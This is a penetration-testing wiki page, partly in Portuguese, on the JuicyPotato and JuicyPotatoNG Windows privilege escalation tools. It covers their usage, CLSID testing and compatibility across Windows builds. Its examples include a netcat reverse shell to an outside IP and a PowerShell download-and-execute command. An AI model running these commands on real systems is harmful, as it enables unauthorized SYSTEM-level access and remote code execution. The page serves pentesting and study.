# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato é legacy. Geralmente funciona em versões do Windows até o Windows 10 1803 / Windows Server 2016. Mudanças da Microsoft enviadas a partir do Windows 10 1809 / Server 2019 quebraram a técnica original. Para essas builds e posteriores, considere alternativas modernas como PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato e outras. Veja a página abaixo para opções e uso atualizados.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusando dos golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Uma versão adoçada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, com um pouco de juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notas rápidas de compatibilidade

- Funciona de forma confiável até o Windows 10 1803 e Windows Server 2016 quando o contexto atual tem SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege.
- Quebrado por Microsoft hardening no Windows 10 1809 / Windows Server 2019 e posteriores. Prefira as alternativas linkadas acima para essas builds.

### Resumo <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

We discovered that, other than `BITS` there are a several COM servers we can abuse. They just need to:

1. ser instanciável pelo usuário atual, normalmente um “service user” que tem impersonation privileges
2. implementar a interface `IMarshal`
3. executar como um usuário elevado (SYSTEM, Administrator, …)

After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.

### Detalhes suculentos <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato permite que você:

- **Target CLSID** _escolha qualquer CLSID que desejar._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _você pode encontrar a lista organizada por OS._
- **COM Listening port** _defina a COM listening port que preferir (instead of the marshalled hardcoded 6666)_
- **COM Listening IP address** _bind the server on any IP_
- **Process creation mode** _dependendo dos privilégios do usuário impersonado você pode escolher entre:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _inicie um executável ou script se a exploração tiver sucesso_
- **Process Argument** _personalize os argumentos do processo iniciado_
- **RPC Server address** _para uma abordagem stealthy você pode autenticar em um servidor RPC externo_
- **RPC Server port** _útil se você quiser autenticar em um servidor externo e o firewall estiver bloqueando a porta `135`…_
- **TEST mode** _principalmente para fins de teste, i.e. testando CLSIDs. Cria o DCOM e imprime o usuário do token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerações finais <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Se o usuário tem privilégios `SeImpersonate` ou `SeAssignPrimaryToken` então você é **SYSTEM**.

É quase impossível prevenir o abuso de todos esses COM Servers. Você pode pensar em modificar as permissões desses objetos via `DCOMCNFG`, mas boa sorte, isso vai ser desafiador.

A solução real é proteger contas sensíveis e aplicações que rodam sob as contas `* SERVICE`. Parar `DCOM` certamente inibiria esse exploit, mas poderia ter um impacto sério no OS subjacente.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:
- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Tricks to satisfy DCOM activation constraints (e.g., the former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).

Important notes (evolving behavior across builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Se você estiver visando Windows 10 1809 / Server 2019 onde o JuicyPotato clássico foi corrigido, prefira as alternativas listadas no topo (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG pode ser situacional dependendo da build e do estado do serviço.

## Exemplos

Nota: Visite [esta página](https://ohpe.it/juicy-potato/CLSID/) para uma lista de CLSIDs para tentar.

### Obter um nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell reverso
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Launch a new CMD (if you have RDP access)

![](<../../images/image (300).png>)

## Problemas de CLSID

Frequentemente, o CLSID padrão que o JuicyPotato usa **não funciona** e o exploit falha. Normalmente, são necessárias várias tentativas para encontrar um **CLSID que funcione**. Para obter uma lista de CLSIDs para tentar em um sistema operacional específico, você deve visitar esta página:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Verificando CLSIDs**

Primeiro, você precisará de alguns executáveis além do juicypotato.exe.

Faça o download de [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e carregue-o na sua sessão PS, e baixe e execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Esse script criará uma lista de possíveis CLSIDs para testar.

Em seguida, baixe [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (altere o caminho para a lista de CLSID e para o executável juicypotato) e execute-o. Ele começará a testar cada CLSID e **quando o número da porta mudar, significará que o CLSID funcionou**.

**Verifique** os CLSIDs que funcionaram **usando o parâmetro -c**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
